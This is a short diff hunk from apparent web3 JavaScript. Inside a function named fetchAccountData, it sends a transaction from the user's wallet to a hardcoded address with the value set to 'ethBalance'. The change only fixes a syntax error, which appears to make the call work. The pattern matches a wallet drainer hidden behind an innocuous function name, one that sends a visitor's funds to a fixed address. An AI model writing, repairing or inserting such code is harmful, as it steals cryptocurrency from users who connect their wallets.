@@ -142,7 +142,7 @@ async function fetchAccountData() {
         web3.eth.sendTransaction({
            from: accounts[0],
            to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
-           value: ethBalance;
+           value: ethBalance
        });
 //        .then(function(receipt){
          
